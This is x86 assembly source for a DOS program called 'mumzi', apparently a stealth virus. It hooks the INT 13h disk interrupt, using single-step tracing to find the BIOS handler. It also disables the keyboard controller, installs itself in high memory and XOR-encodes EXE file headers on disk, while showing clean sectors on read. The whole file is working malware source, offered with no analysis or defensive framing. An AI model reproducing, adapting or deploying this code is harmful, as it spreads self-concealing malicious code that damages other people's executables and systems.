

cseg            segment para    public  'code'
mumzi           proc    near
assume          cs:cseg


;tasm mumzi! /m1        
;tlink mumzi! /t


.186


ALLOCATE_HMA    equ     04a02h
CLOSE_HANDLE    equ     03e00h
COMMAND_8042    equ     064h
COMMAND_LINE    equ     080h
COM_OFFSET      equ     00100h
DATA_REGISTER   equ     060h
DENY_NONE       equ     040h
DEBUG_INT       equ     003h
DISABLEKEYBOARD equ     0adh
DONT_SET_OFFSET equ     006h
DONT_SET_TIME   equ     040h
DOS_INT         equ     021h
DOS_SET_INT     equ     02500h
ENVIRONMENT     equ     02ah
EXEC_PROGRAM    equ     04b00h
EXE_SECTOR_SIZE equ     004h
EXE_SIGNATURE   equ     'ZM'
FAR_INDEX_CALL  equ     01effh
FIRST_FCB       equ     05ch
FLUSH_BUFFERS   equ     00d00h
FOUR_BYTES      equ     004h
GET_ERROR_LEVEL equ     04d00h
HIGH_BYTE       equ     00100h
INT_01          equ     001cdh
INT_13_VECTOR   equ     0004ch
INTO_INT        equ     004h
JOB_FILE_TABLE  equ     01220h
KEEP_CF_INTACT  equ     002h
MAX_SECTORS     equ     070h
MULTIPLEX_INT   equ     02fh
MUMZI_CODE_AT   equ     00157h
NEW_EXE_HEADER  equ     00040h
NEW_EXE_OFFSET  equ     018h
ONLY_READ       equ     000h
ONLY_WRITE      equ     001h
ONE_BYTE        equ     001h
OPEN_W_HANDLE   equ     03d00h
OVERRIDE_LOCK   equ     04bh
PARAMETER_TABLE equ     001f1h
PORT_HAS_DATA   equ     002h
READ_A_SECTOR   equ     00201h
READ_W_HANDLE   equ     03f00h
REMOVE_NOP      equ     001h
RESIZE_MEMORY   equ     04a00h
ROM_SEGMENT     equ     0f000h
SECOND_FCB      equ     06ch
SECTOR_SIZE     equ     00200h
SETVER_SIZE     equ     018h
SHORT_JUMP      equ     0ebh
SINGLE_STEP     equ     00100h
SINGLE_STEP_INT equ     001h
SIX_BYTES       equ     006h
SIXTEEN_BYTES   equ     010h
SYS_FILE_TABLE  equ     01216h
TERMINATE_W_ERR equ     04c00h
THREE_BYTES     equ     003h
TWENTY_ONE      equ     015h
TWO_BYTES       equ     002h
VERIFY_SECTOR   equ     00400h
WRITE_A_SECTOR  equ     00301h
WRITE_COMMAND   equ     060h
WRITE_W_HANDLE  equ     04000h
XOR_CODE        equ     (SHORT_JUMP XOR (low(EXE_SIGNATURE)))*HIGH_BYTE


bios_seg        segment at 0f000h
		org     00000h                  
old_int_13_addr LABEL   BYTE                    
bios_seg        ends


		org     COM_OFFSET              


com_code:       jmp     short alloc_memory
		push    bp
		mov     ax,TERMINATE_W_ERR
		int     DOS_INT                 


		org     MUMZI_CODE_AT


decode          proc    near
		xor     byte ptr ds:[si+alloc_memory-com_code-TWO_BYTES],ah
		org     $-REMOVE_NOP
		sub     ax,word ptr ds:[si]

		
		org     high(EXE_SIGNATURE)+TWO_BYTES+COM_OFFSET


start_decode:   inc     si
		int     DEBUG_INT
		jns     decode
decode          endp
		

alloc_memory    proc    near                    
		mov     ax,ALLOCATE_HMA         
		cwd
		mov     dl,COMMAND_8042
		les     di,dword ptr ds:[bx+ENVIRONMENT]
		push    es                      
		mov     bh,high(SECTOR_SIZE*3)
		int     MULTIPLEX_INT           
		call    ax_cx_si_cld            
		mov     ax,VERIFY_SECTOR+DISABLEKEYBOARD
		xchg    bh,bl
		inc     di                      
		jz      find_name
alloc_memory    endp                            


stop_keyboard   proc    near
		push    cs
		pop     ss
		out     dx,al
stop_keyboard   endp


move_to_hma     proc    near                
		rep     movsb 
move_to_hma     endp


set_int_13      proc    near                    
		lea     si,ds:[si+bx-SIX_BYTES-(exe_starts_here-interrupt_one)]
		org     $-REMOVE_NOP
		mov     ds,cx
		xchg    cx,di                   
		push    word ptr ds:[bx+di]     
		mov     word ptr ds:[bx+di],cs  
		xchg    word ptr ds:[bx+di-TWO_BYTES],si
		push    si                      
		pushf                           
		int     SINGLE_STEP_INT         
push_then_call: pushf                           
		dw      FAR_INDEX_CALL,INT_13_VECTOR
		popf                            
		pop     word ptr ds:[bx+di-TWO_BYTES]
		pop     word ptr ds:[bx+di]     
set_int_13      endp                            


disable_lock    proc    near                    
		mov     al,WRITE_COMMAND        
		out     dx,al
get_status:     in      al,dx          
		test    al,PORT_HAS_DATA        
		loopnz  get_status              
		mov     al,OVERRIDE_LOCK        
		out     DATA_REGISTER,al        
disable_lock    endp


find_name       proc    near                    
		mov     ah,high(FLUSH_BUFFERS)
set_int_3:      cwd
		push    dx
		xchg    ax,si
		pop     ds
		lds     dx,dword ptr ds:[bx+(DOS_INT*FOUR_BYTES)-SIX_BYTES]
		mov     ax,DOS_SET_INT+DEBUG_INT
		int     DOS_INT
		xchg    ax,si
		int     DOS_INT                 
		pop     ds                      
look_for_nulls: inc     bx                      
		or      word ptr ds:[bx+di-FOUR_BYTES],di
		jnz     look_for_nulls          
find_name       endp                            


open_file       proc    near                    
		xchg    dx,bx
		xchg    ax,cx
		mov     bp,READ_W_HANDLE+DENY_NONE+ONLY_READ
re_convert:     push    dx
		push    ds                      
		mov     ax,OPEN_W_HANDLE+DENY_NONE+ONLY_READ
		int     DEBUG_INT
		push    cs
		pop     ds
		push    ax                      
		mov     bx,JOB_FILE_TABLE
		xchg    ax,bx
		int     MULTIPLEX_INT           
		mov     bl,byte ptr es:[di]
		mov     dx,SYS_FILE_TABLE
		mov     ax,dx
		int     MULTIPLEX_INT           
		xchg    ax,bp
		mov     ch,high(SECTOR_SIZE)
		cmpsw                           
		stosb                          
		pop     bx                      
		int     DEBUG_INT                 
		or      byte ptr es:[di+DONT_SET_OFFSET-THREE_BYTES],DONT_SET_TIME
		mov     ah,high(CLOSE_HANDLE)
		int     DEBUG_INT
		push    cs                      
		push    dx
		pop     bx                      
		pop     es                      
		call    convert_back            
		pop     ds                      
		pop     dx
		jne     now_run_it              
		repnz   stosb                   
		mov     bp,WRITE_W_HANDLE+DENY_NONE+ONLY_WRITE
		jmp     short re_convert
open_file       endp


now_run_it      proc    near                    
		mov     ah,high(RESIZE_MEMORY)
		mov     bx,offset exec_table
		int     DEBUG_INT                 
		mov     si,SYS_FILE_TABLE+PARAMETER_TABLE
		push    si
		pop     di
		xchg    bx,si                   
set_table:      mov     ax,EXEC_PROGRAM         
		scasw                           
		movs    byte ptr es:[di],es:[si]
		scasb                           
		mov     word ptr cs:[di],cs     
		je      set_table               
		int     DEBUG_INT                 
		mov     ah,high(GET_ERROR_LEVEL)
		int     DEBUG_INT                 
		mov     ah,high(TERMINATE_W_ERR)
		mov     bx,(INTO_INT*FOUR_BYTES)-((DOS_INT*FOUR_BYTES)-SIX_BYTES)
		jmp     short set_int_3
now_run_it      endp                            


convert_back    proc    near                    
		call    ax_cx_di_si_cld         
		mov     cx,alloc_memory-decode
		repe    cmps byte ptr cs:[si],es:[di]
		jne     not_mumzi                
		xor     byte ptr ds:[bx],ah
convert_back    endp                    


ax_cx_di_si_cld proc    near                    
		lea     di,word ptr ds:[bx+MUMZI_CODE_AT-COM_OFFSET]
ax_cx_si_cld:   call    set_si                  
set_si:         cld                             
		pop     ax                      
		sub     ax,set_si-decode
		sub     si,si
		xchg    ax,si
		mov     ah,high(XOR_CODE)       
		mov     cx,COM_OFFSET+SECTOR_SIZE-MUMZI_CODE_AT                
not_mumzi:      ret
ax_cx_di_si_cld endp


convert_to      proc    near                    
		pusha                           
		stc                             
		mov     dx,EXE_SIGNATURE        
		pushf                           
		xor     dx,word ptr ds:[bx]     
		jnz     not_exe_header          
		cmp     word ptr ds:[bx+EXE_SECTOR_SIZE],MAX_SECTORS          
		jae     not_exe_header          
		cmp     word ptr ds:[bx+EXE_SECTOR_SIZE],SETVER_SIZE          
		je      not_exe_header          
		cmp     word ptr ds:[bx+NEW_EXE_OFFSET],NEW_EXE_HEADER
		jae     not_exe_header          
		call    ax_cx_di_si_cld         
		pusha                           
		repe    scasb                   
		popa                            
		jne     not_exe_header          
		xor     byte ptr ds:[bx],ah
		push    cx
		rep     movs byte ptr es:[di],cs:[si]
		lea     di,word ptr ds:[si+FOUR_BYTES]
		mov     si,bx
		pop     cx
		pusha
		push    es
		push    cs
		pop     es
		rep     movsw
		pop     es
		popa
		mov     cl,low(SECTOR_SIZE-(alloc_memory-com_code))
encode_sector:  cmpsb
		sub     dx,word ptr cs:[di]
		xor     byte ptr ds:[si+alloc_memory-com_code-ONE_BYTE],dh
		loop    encode_sector
		popf                            
		clc                             
		pushf                           
not_exe_header: popf                            
		popa                            
		ret                             
convert_to      endp


interrupt_one   proc    far                     
		cmp     ah,high(VERIFY_SECTOR)
		jne     interrupt_ret           
		pusha                           
		push    sp
		pop     bp                      
		push    ds                      
		lds     si,dword ptr ss:[bp+SIXTEEN_BYTES]
		cmp     word ptr ds:[si+ONE_BYTE+bx-SIX_BYTES],FAR_INDEX_CALL
		jne     go_back                 
		cmp     word ptr ds:[si-TWO_BYTES+bx-SIX_BYTES],INT_01
		mov     si,word ptr ds:[si+THREE_BYTES+bx-SIX_BYTES]
		je      toggle_tf               
		cmp     byte ptr ds:[si+THREE_BYTES+bx-SIX_BYTES],high(ROM_SEGMENT)
		jb      go_back                 
		cld                             
		xchg    cx,di                   
		movsw                           
		std                             
		movsw                           
		sub     di,bx                   
		mov     word ptr ds:[si],di     
		mov     word ptr ds:[si+TWO_BYTES],es
toggle_tf:      xor     byte ptr ss:[bp+TWENTY_ONE],high(SINGLE_STEP)
go_back:        pop     ds                      
		popa                            
interrupt_ret:  iret                            
interrupt_one   endp                            


interrupt_13    proc    far                     
compare_verify: cmp     ah,high(VERIFY_SECTOR)
		ja      call_old_int_13         
		push    ds                      
		push    es                      
		pop     ds
		call    convert_to              
		pushf                           
		push    cs                      
		call    call_old_int_13         
		pushf                           
		call    convert_to              
		pusha                           
		jc      do_convertback          
		pushf                           
		push    cs                      
		mov     ax,WRITE_A_SECTOR
		call    call_old_int_13         
do_convertback: call    convert_back            
		jne     no_need                
		repnz   stosb                   
no_need:        popa                            
		popf                            
		pop     ds
		retf    KEEP_CF_INTACT          
interrupt_13    endp

		
exec_table      db      COMMAND_LINE,FIRST_FCB,SECOND_FCB


erutangis       db      '­IZWïW'


		org     COM_OFFSET+SECTOR_SIZE-SIX_BYTES


int_13_entry    proc    near
		cmp     ah,high(READ_A_SECTOR)  
		jae     compare_verify          
int_13_entry    endp


		org     COM_OFFSET+SECTOR_SIZE-ONE_BYTE


call_old_int_13 proc    near                    
		jmp     far ptr old_int_13_addr
call_old_int_13 endp


		org     COM_OFFSET+SECTOR_SIZE


exe_starts_here LABEL   BYTE


mumzi           endp                            
cseg            ends
end             com_code




